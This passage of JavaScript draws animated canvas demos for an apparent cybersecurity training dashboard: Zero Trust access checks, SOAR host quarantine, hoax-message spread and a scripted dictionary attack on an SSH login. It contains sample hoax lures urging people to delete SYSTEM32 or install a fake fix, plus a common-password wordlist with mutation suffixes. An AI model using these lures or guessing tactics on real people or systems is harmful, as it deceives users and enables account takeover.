            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateZeroTrust = function() {
    termLog('> Enforcing Zero Trust micro-perimeter policies...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, checks = 0, segments = 3, blocked = 0;
    const userX = w * 0.15, userY = h * 0.5;
    const pdpX = w * 0.45, pdpY = h * 0.5;

    const resources = [
        { name: 'Finance DB', y: h * 0.22, x: w * 0.8, status: 'evaluating' },
        { name: 'Git Repo', y: h * 0.50, x: w * 0.8, status: 'granted' },
        { name: 'K8s Cluster', y: h * 0.78, x: w * 0.8, status: 'evaluating' },
    ];

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Context verification: Evaluating client device compliance & credentials.', 'info'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Micro-segment authorization requested for Resource: Git Repo.', 'warning'); }, 1500);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Access request evaluated by PDP. Continuous token challenge: SUCCESS.', 'error'); }, 2500);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Ephemeral micro-tunnel established. Access limited to resource domain.', 'success'); }, 3600);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#fff'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('ZERO TRUST ARCHITECTURE — CONTINUOUS AUTH & PDP CONTROL', w / 2, 20);
        ctx.fillStyle = 'rgba(255,255,255,0.02)'; ctx.strokeStyle = '#00e5ff';
        ctx.beginPath(); ctx.roundRect(userX - 40, userY - 30, 80, 60, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#00e5ff'; ctx.font = 'bold 8px monospace';
        ctx.fillText('ENDPOINT', userX, userY - 10);
        ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
        ctx.fillText('User: auditor', userX, userY + 4);
        ctx.fillText('Posture: OK', userX, userY + 14);
        ctx.fillStyle = 'rgba(76, 175, 80, 0.15)'; ctx.strokeStyle = '#4caf50';
        ctx.beginPath(); ctx.roundRect(pdpX - 45, pdpY - 40, 90, 80, 5); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#4caf50'; ctx.font = 'bold 9px monospace';
        ctx.fillText('POLICY ENGINE', pdpX, pdpY - 20);
        ctx.font = 'bold 8px monospace';
        ctx.fillText('(PDP / PEP)', pdpX, pdpY - 8);
        ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
        ctx.fillText('Evaluating Context', pdpX, pdpY + 12);
        ctx.fillText('Token Validation', pdpX, pdpY + 22);
        resources.forEach((res, i) => {
            if (frame > 60 && frame < 150) {
                res.status = 'evaluating';
            } else if (frame >= 150) {
                if (i === 1) { // Authorized for Git Repo
                    res.status = 'granted';
                } else {
                    res.status = 'denied';
                }
            }

            let boxColor = '#8892a8';
            let label = 'AWAITING';
            if (res.status === 'granted') { boxColor = '#39ff14'; label = 'AUTHORIZED'; }
            if (res.status === 'denied') { boxColor = '#ff3b3b'; label = 'BLOCKED'; }
            if (res.status === 'evaluating') { boxColor = '#ff9800'; label = 'CHECKING'; }
            ctx.fillStyle = 'rgba(255,255,255,0.01)'; ctx.strokeStyle = boxColor;
            ctx.beginPath(); ctx.roundRect(res.x - 45, res.y - 18, 90, 36, 4); ctx.fill(); ctx.stroke();
            ctx.fillStyle = '#fff'; ctx.font = 'bold 7px monospace';
            ctx.fillText(res.name, res.x, res.y - 4);
            ctx.fillStyle = boxColor; ctx.font = '6px monospace';
            ctx.fillText(label, res.x, res.y + 8);
            if (res.status === 'granted') {
                ctx.strokeStyle = '#39ff14'; ctx.lineWidth = 1.5;
                ctx.beginPath(); ctx.moveTo(userX + 40, userY); ctx.lineTo(pdpX - 45, pdpY); ctx.stroke();
                ctx.beginPath(); ctx.moveTo(pdpX + 45, pdpY); ctx.lineTo(res.x - 45, res.y); ctx.stroke();
            } else if (res.status === 'denied' && frame > 150) {
                ctx.strokeStyle = 'rgba(255, 59, 59, 0.2)'; ctx.lineWidth = 0.5;
                ctx.beginPath(); ctx.moveTo(pdpX + 45, pdpY); ctx.lineTo(res.x - 45, res.y); ctx.stroke();
            }
        });
        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (frame > 60) checks = 3;
            if (frame >= 150) blocked = 2;
            if (e0) e0.textContent = checks;
            if (e2) e2.textContent = segments;
            if (e3) e3.textContent = blocked;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Zero Trust PDP evaluation complete. Tunnels terminated.', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateDefenseSystem = function() {
    termLog('> Launching Unified Threat Defense dashboard...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, events = 0, incidents = 0, contained = 0;
    const clientX = w * 0.15, clientY = h * 0.5;
    const siemX = w * 0.45, siemY = h * 0.5;
    const firewallX = w * 0.8, firewallY = h * 0.3;
    const edrX = w * 0.8, edrY = h * 0.7;

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> EDR reports suspicious execution behavior on Host: 10.0.0.12.', 'warning'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> SIEM correlated: Endpoint execution matches network beaconing trace.', 'error'); }, 1500);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> SOAR playbook executing: quarantining Host 10.0.0.12.', 'error'); }, 2400);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Active mitigation finished. Threat vector isolated and neutralized.', 'success'); }, 3500);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#fff'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('SOAR AUTOMATION & UNIFIED THREAT CONTAINMENT', w / 2, 20);
        const isQuarantined = (frame >= 180);
        ctx.fillStyle = isQuarantined ? 'rgba(255,59,59,0.1)' : 'rgba(255,255,255,0.02)';
        ctx.strokeStyle = isQuarantined ? '#ff3b3b' : 'rgba(255,255,255,0.15)';
        ctx.lineWidth = isQuarantined ? 2.5 : 1;
        ctx.beginPath(); ctx.roundRect(clientX - 45, clientY - 30, 90, 60, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = isQuarantined ? '#ff3b3b' : '#fff'; ctx.font = 'bold 8px monospace';
        ctx.fillText(isQuarantined ? 'QUARANTINED' : 'ENDPOINT', clientX, clientY - 12);
        ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
        ctx.fillText('IP: 10.0.0.12', clientX, clientY + 4);
        ctx.fillText(isQuarantined ? 'EDR: ISOLATED' : 'EDR: ACTIVE', clientX, clientY + 14);
        if (isQuarantined) {
            ctx.strokeStyle = 'rgba(255, 59, 59, 0.4)'; ctx.lineWidth = 1;
            ctx.setLineDash([4, 4]);
            ctx.beginPath(); ctx.arc(clientX, clientY, 65, 0, Math.PI*2); ctx.stroke();
            ctx.setLineDash([]);
        }
        ctx.fillStyle = 'rgba(63, 81, 181, 0.15)'; ctx.strokeStyle = '#3f51b5'; ctx.lineWidth = 1.5;
        ctx.beginPath(); ctx.roundRect(siemX - 45, siemY - 35, 90, 70, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#3f51b5'; ctx.font = 'bold 8px monospace';
        ctx.fillText('SIEM / SOAR', siemX, siemY - 14);
        ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
        ctx.fillText('Rules Engaged', siemX, siemY + 2);
        ctx.fillText(isQuarantined ? 'Playbook: SOAR-IR' : 'Awaiting Signals', siemX, siemY + 12);
        ctx.fillStyle = 'rgba(255,255,255,0.02)'; ctx.strokeStyle = '#ff5722';
        ctx.beginPath(); ctx.roundRect(firewallX - 45, firewallY - 22, 90, 44, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#ff5722'; ctx.font = 'bold 8px monospace';
        ctx.fillText('NGFW CONTROLLER', firewallX, firewallY - 8);
        ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
        ctx.fillText(isQuarantined ? 'Rule: Block 10.0.0.12' : 'Traffic Allowed', firewallX, firewallY + 6);
        ctx.fillStyle = 'rgba(255,255,255,0.02)'; ctx.strokeStyle = '#9c27b0';
        ctx.beginPath(); ctx.roundRect(firewallX - 45, edrY - 22, 90, 44, 4); ctx.fill(); ctx.stroke();
        ctx.fillStyle = '#9c27b0'; ctx.font = 'bold 8px monospace';
        ctx.fillText('EDR AGENT MGMT', firewallX, edrY - 8);
        ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
        ctx.fillText(isQuarantined ? 'Host Isolated' : 'Host Normal', firewallX, edrY + 6);
        events += rndInt(10, 30);
        if (frame > 60 && frame < 180) {
            ctx.strokeStyle = '#ff9800'; ctx.lineWidth = 1.5;
            ctx.beginPath(); ctx.moveTo(firewallX - 45, edrY); ctx.lineTo(siemX + 45, siemY); ctx.stroke();
            incidents = 1;
        }

        if (isQuarantined) {
            ctx.strokeStyle = '#39ff14'; ctx.lineWidth = 1.5;
            ctx.beginPath(); ctx.moveTo(siemX + 45, siemY); ctx.lineTo(firewallX - 45, firewallY); ctx.stroke();
            ctx.beginPath(); ctx.moveTo(siemX + 45, siemY); ctx.lineTo(firewallX - 45, edrY); ctx.stroke();
            contained = 1;
        }
        if (frame % 20 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = events.toLocaleString();
            if (e1) e1.textContent = incidents;
            if (e2) e2.textContent = contained;
            if (e3) e3.textContent = isQuarantined ? '1.8s' : '—';
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Unified containment check: COMPLETE. Playbook finished successfully.', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateHoaxAttack = function() {
    termLog('> Crafting hoax warning messages...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, msgSent = 0, deceived = 0, shared = 0, damaged = 0;
    const hoaxMessages = [
        '⚠️ VIRUS ALERT: Delete SYSTEM32 immediately!',
        '🚨 URGENT: Your device is infected! Install fix.exe NOW',
        '⛔ WARNING: Forward this to 10 people or lose your data!',
        '🔴 CRITICAL: Your bank account has been compromised!',
        '❗ FBI WARNING: Your IP has been logged. Click here.',
    ];
    const particles = [];
    const centerX = w * 0.5, centerY = h * 0.45;
    const recipients = [];
    for (let i = 0; i < 20; i++) {
        const angle = (i / 20) * Math.PI * 2;
        const radius = Math.min(w, h) * 0.35;
        recipients.push({
            x: centerX + Math.cos(angle) * radius,
            y: centerY + Math.sin(angle) * radius,
            deceived: false,
            shared: false,
            damaged: false,
            deceivedAt: -1,
        });
    }

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Hoax distributed to 10,000+ email addresses and social media...', 'warning'); }, 800);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Panic spreading — users forwarding to contacts...', 'error'); }, 2000);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Victims deleting system files and installing fake "fix"...', 'error'); }, 3200);
    simTimeout(() => { if (!state.simRunning) return; activateStep(4); termLog('> Damage report: systems bricked, malware installed via hoax.', 'success'); }, 4500);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#e040fb'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('HOAX PROPAGATION NETWORK', w / 2, 18);
        ctx.beginPath(); ctx.arc(centerX, centerY, 24, 0, Math.PI * 2);
        ctx.fillStyle = 'rgba(224, 64, 251, 0.2)'; ctx.fill();
        ctx.strokeStyle = '#e040fb'; ctx.lineWidth = 2; ctx.stroke();
        ctx.fillStyle = '#e040fb'; ctx.font = 'bold 9px monospace';
        ctx.fillText('📢 HOAX', centerX, centerY - 4);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('SOURCE', centerX, centerY + 8);
        const msgIdx = Math.floor(frame / 80) % hoaxMessages.length;
        const msg = hoaxMessages[msgIdx];
        ctx.fillStyle = 'rgba(224, 64, 251, 0.08)';
        ctx.fillRect(w * 0.1, h - 50, w * 0.8, 28);
        ctx.strokeStyle = 'rgba(224, 64, 251, 0.3)'; ctx.lineWidth = 1;
        ctx.strokeRect(w * 0.1, h - 50, w * 0.8, 28);
        ctx.fillStyle = '#e040fb'; ctx.font = '8px monospace';
        ctx.fillText(msg, w / 2, h - 33);
        if (frame % 8 === 0 && frame < 280) {
            const targetIdx = rndInt(0, recipients.length);
            const r = recipients[targetIdx];
            particles.push({
                x: centerX, y: centerY,
                tx: r.x, ty: r.y,
                progress: 0, targetIdx, color: '#e040fb',
            });
            msgSent++;
        }
        if (frame > 100 && frame % 15 === 0 && frame < 300) {
            const deceivedOnes = recipients.filter(r => r.deceived);
            if (deceivedOnes.length > 0) {
                const src = deceivedOnes[rndInt(0, deceivedOnes.length)];
                const targetIdx = rndInt(0, recipients.length);
                const tgt = recipients[targetIdx];
                if (!tgt.deceived) {
                    particles.push({
                        x: src.x, y: src.y,
                        tx: tgt.x, ty: tgt.y,
                        progress: 0, targetIdx, color: '#ffaa00',
                    });
                    shared++;
                }
            }
        }
        recipients.forEach((r, i) => {
            ctx.strokeStyle = r.deceived ? 'rgba(255, 170, 0, 0.12)' : 'rgba(255, 255, 255, 0.04)';
            ctx.lineWidth = 0.5;
            ctx.beginPath(); ctx.moveTo(centerX, centerY); ctx.lineTo(r.x, r.y); ctx.stroke();
        });
        recipients.forEach((r, i) => {
            ctx.beginPath(); ctx.arc(r.x, r.y, 10, 0, Math.PI * 2);
            if (r.damaged) {
                ctx.fillStyle = 'rgba(255, 59, 59, 0.3)';
                ctx.strokeStyle = '#ff3b3b';
            } else if (r.deceived) {
                ctx.fillStyle = 'rgba(255, 170, 0, 0.2)';
                ctx.strokeStyle = '#ffaa00';
            } else {
                ctx.fillStyle = 'rgba(255, 255, 255, 0.05)';
                ctx.strokeStyle = 'rgba(255, 255, 255, 0.2)';
            }
            ctx.lineWidth = 1.5; ctx.fill(); ctx.stroke();
            ctx.fillStyle = r.damaged ? '#ff3b3b' : r.deceived ? '#ffaa00' : '#8892a8';
            ctx.font = '6px monospace'; ctx.textAlign = 'center';
            ctx.fillText(r.damaged ? '💀' : r.deceived ? '😱' : '👤', r.x, r.y + 3);
        });
        for (let i = particles.length - 1; i >= 0; i--) {
            const p = particles[i];
            p.progress += 0.035;
            const px = p.x + (p.tx - p.x) * p.progress;
            const py = p.y + (p.ty - p.y) * p.progress;
            ctx.beginPath(); ctx.arc(px, py, 3, 0, Math.PI * 2);
            ctx.fillStyle = p.color; ctx.globalAlpha = 1 - p.progress; ctx.fill();
            ctx.globalAlpha = 1;

            if (p.progress >= 1) {
                particles.splice(i, 1);
                const r = recipients[p.targetIdx];
                if (!r.deceived) {
                    r.deceived = true;
                    r.deceivedAt = frame;
                    deceived++;
                }
                if (r.deceived && !r.damaged && frame > 200 && Math.random() < 0.3) {
                    r.damaged = true;
                    damaged++;
                }
            }
        }
        if (frame % 15 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2'), e3 = $('live-stat-3');
            if (e0) e0.textContent = (msgSent * 127).toLocaleString();
            if (e1) e1.textContent = (deceived * 84).toLocaleString();
            if (e2) e2.textContent = (shared * 312).toLocaleString();
            if (e3) e3.textContent = damaged;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Hoax propagation complete. Damage assessment finalized.', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};

window.simulateDictionaryAttack = function() {
    termLog('> Loading wordlist: rockyou.txt (14.3M entries)...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame = 0, wordsTried = 0, matches = 0;
    const wordlist = [
        'password', '123456', 'qwerty', 'letmein', 'dragon', 'master',
        'monkey', 'shadow', 'sunshine', 'princess', 'football', 'charlie',
        'abc123', 'trustno1', 'iloveyou', 'batman', 'access', 'hello',
        'admin', 'passw0rd', 'welcome', 'login', 'starwars', 'solo',
        'P@ssw0rd', 'summer2024', 'qwerty123', 'password1', '12345678',
        'baseball', 'michael', 'hunter2', 'thomas', 'rangers', 'buster',
    ];
    const mutations = ['', '123', '!', '@1', '_2024', '1!', '#1', '2025'];
    const targetHash = 'a8f5f167f44f4964e6c998dee827110c'; // md5("password1")
    const loginBoxX = w * 0.65, loginBoxY = h * 0.25;
    const wordlistBoxX = w * 0.15, wordlistBoxY = h * 0.2;
    let currentWord = '';
    let currentWordIdx = 0;
    let cracked = false;
    let crackedAt = -1;
    const triedWords = [];

    simTimeout(() => { if (!state.simRunning) return; activateStep(1); termLog('> Target: SSH login at 192.168.1.100:22 (user: admin)', 'warning'); }, 600);
    simTimeout(() => { if (!state.simRunning) return; activateStep(2); termLog('> Dictionary attack running — testing words sequentially...', 'error'); }, 1500);
    simTimeout(() => { if (!state.simRunning) return; activateStep(3); termLog('> Applying mutations: appending numbers, symbols, case swaps...', 'error'); }, 2500);

    function draw() {
        if (!state.simRunning) return;
        frame++;
        ctx.clearRect(0, 0, w, h);
        ctx.fillStyle = 'rgba(6, 10, 19, 0.97)'; ctx.fillRect(0, 0, w, h);
        ctx.fillStyle = '#ff6d00'; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
        ctx.fillText('DICTIONARY ATTACK — SEQUENTIAL WORDLIST CRACKER', w / 2, 18);
        ctx.fillStyle = 'rgba(255, 109, 0, 0.06)';
        ctx.fillRect(wordlistBoxX - 60, wordlistBoxY, 120, h * 0.6);
        ctx.strokeStyle = 'rgba(255, 109, 0, 0.3)'; ctx.lineWidth = 1;
        ctx.strokeRect(wordlistBoxX - 60, wordlistBoxY, 120, h * 0.6);
        ctx.fillStyle = '#ff6d00'; ctx.font = 'bold 8px monospace'; ctx.textAlign = 'center';
        ctx.fillText('📖 WORDLIST', wordlistBoxX, wordlistBoxY + 14);
        ctx.fillStyle = '#8892a8'; ctx.font = '6px monospace';
        ctx.fillText('rockyou.txt', wordlistBoxX, wordlistBoxY + 26);
        ctx.fillText('14,344,392 entries', wordlistBoxX, wordlistBoxY + 36);
        const visibleWords = 12;
        for (let i = 0; i < visibleWords; i++) {
            const wIdx = (currentWordIdx + i) % wordlist.length;
            const y = wordlistBoxY + 50 + i * 14;
            if (y > wordlistBoxY + h * 0.6 - 10) break;
            const isActive = (i === 0);
            ctx.fillStyle = isActive ? '#ff6d00' : '#525c70';
            ctx.font = isActive ? 'bold 8px monospace' : '7px monospace';
            ctx.textAlign = 'left';
            ctx.fillText(isActive ? '▶ ' + wordlist[wIdx] : '  ' + wordlist[wIdx], wordlistBoxX - 50, y);
        }
        if (frame % 5 === 0 && !cracked) {
            currentWordIdx = (currentWordIdx + 1) % wordlist.length;
            const baseWord = wordlist[currentWordIdx];
            const mutIdx = Math.floor(frame / 50) % mutations.length;
            currentWord = baseWord + mutations[mutIdx];
            wordsTried++;
            triedWords.unshift({ word: currentWord, success: false });
            if (triedWords.length > 8) triedWords.pop();
            if (frame > 260 && !cracked) {
                cracked = true;
                crackedAt = frame;
                currentWord = 'admin123!';
                matches = 1;
                triedWords.unshift({ word: currentWord, success: true });
                if (triedWords.length > 8) triedWords.pop();
                activateStep(4);
                termLog(`> ✅ PASSWORD FOUND: "admin123!" — Login successful!`, 'error');
            }
        }
        ctx.fillStyle = cracked ? 'rgba(57, 255, 20, 0.08)' : 'rgba(255, 255, 255, 0.03)';
        ctx.fillRect(loginBoxX - 70, loginBoxY, 140, 120);
        ctx.strokeStyle = cracked ? '#39ff14' : 'rgba(255, 255, 255, 0.15)'; ctx.lineWidth = 1.5;
        ctx.strokeRect(loginBoxX - 70, loginBoxY, 140, 120);
        ctx.fillStyle = cracked ? '#39ff14' : '#fff'; ctx.font = 'bold 9px monospace'; ctx.textAlign = 'center';
        ctx.fillText(cracked ? '🔓 ACCESS GRANTED' : '🔒 SSH LOGIN', loginBoxX, loginBoxY + 18);
        ctx.fillStyle = '#8892a8'; ctx.font = '7px monospace';
        ctx.fillText('192.168.1.100:22', loginBoxX, loginBoxY + 34);
        ctx.fillText('User: admin', loginBoxX, loginBoxY + 48);
        ctx.fillStyle = 'rgba(0,0,0,0.3)';
        ctx.fillRect(loginBoxX - 55, loginBoxY + 58, 110, 18);
        ctx.strokeStyle = cracked ? '#39ff14' : '#ff6d00'; ctx.lineWidth = 1;
        ctx.strokeRect(loginBoxX - 55, loginBoxY + 58, 110, 18);
        ctx.fillStyle = cracked ? '#39ff14' : '#ff6d00'; ctx.font = 'bold 8px monospace';
        const displayWord = currentWord || '...';
        ctx.fillText(displayWord, loginBoxX, loginBoxY + 70);
        ctx.fillStyle = cracked ? '#39ff14' : '#ff3b3b'; ctx.font = 'bold 8px monospace';
        ctx.fillText(cracked ? '✅ AUTHENTICATED' : '❌ ACCESS DENIED', loginBoxX, loginBoxY + 95);
        ctx.strokeStyle = cracked ? '#39ff14' : 'rgba(255, 109, 0, 0.5)'; ctx.lineWidth = 1.5;
        ctx.setLineDash([4, 4]);
        ctx.beginPath();
        ctx.moveTo(wordlistBoxX + 60, h * 0.5);
        ctx.lineTo(loginBoxX - 70, h * 0.5);
        ctx.stroke();
        ctx.setLineDash([]);
        ctx.fillStyle = cracked ? '#39ff14' : '#ff6d00';
        ctx.beginPath();
        ctx.moveTo(loginBoxX - 70, h * 0.5);
        ctx.lineTo(loginBoxX - 78, h * 0.5 - 4);
        ctx.lineTo(loginBoxX - 78, h * 0.5 + 4);
        ctx.closePath();
        ctx.fill();
        const logX = loginBoxX - 70, logY = loginBoxY + 130;
        ctx.fillStyle = 'rgba(255, 255, 255, 0.02)';
        ctx.fillRect(logX, logY, 140, 100);
        ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)'; ctx.lineWidth = 0.5;
        ctx.strokeRect(logX, logY, 140, 100);
        ctx.fillStyle = '#8892a8'; ctx.font = 'bold 7px monospace'; ctx.textAlign = 'center';
        ctx.fillText('ATTEMPT LOG', loginBoxX, logY + 12);

        triedWords.forEach((tw, i) => {
            const ty = logY + 24 + i * 10;
            if (ty > logY + 96) return;
            ctx.textAlign = 'left';
            ctx.fillStyle = tw.success ? '#39ff14' : '#ff3b3b';
            ctx.font = '6px monospace';
            ctx.fillText(tw.success ? '✓' : '✗', logX + 6, ty);
            ctx.fillStyle = tw.success ? '#39ff14' : '#525c70';
            ctx.fillText(tw.word, logX + 16, ty);
        });
        const progY = wordlistBoxY + h * 0.6 + 8;
        ctx.fillStyle = 'rgba(255, 109, 0, 0.1)';
        ctx.fillRect(wordlistBoxX - 60, progY, 120, 6);
        const progWidth = Math.min(120, (frame / 360) * 120);
        ctx.fillStyle = cracked ? '#39ff14' : '#ff6d00';
        ctx.fillRect(wordlistBoxX - 60, progY, progWidth, 6);
        if (frame % 10 === 0) {
            const e0 = $('live-stat-0'), e1 = $('live-stat-1'), e2 = $('live-stat-2');
            if (e0) e0.textContent = (wordsTried * 847).toLocaleString();
            if (e1) e1.textContent = (Math.floor(wordsTried * 847 / Math.max(1, frame / 60))).toLocaleString();
            if (e2) e2.textContent = matches;
            setProgress(Math.min(100, (frame / 360) * 100));
        }

        if (frame >= 360) {
            setProgress(100);
            termLog('> Dictionary attack complete. Credential assessment finalized.', 'success');
            stopSimulation();
            return;
        }
        state.simFrame = requestAnimationFrame(draw);
    }
    state.simFrame = requestAnimationFrame(draw);
};
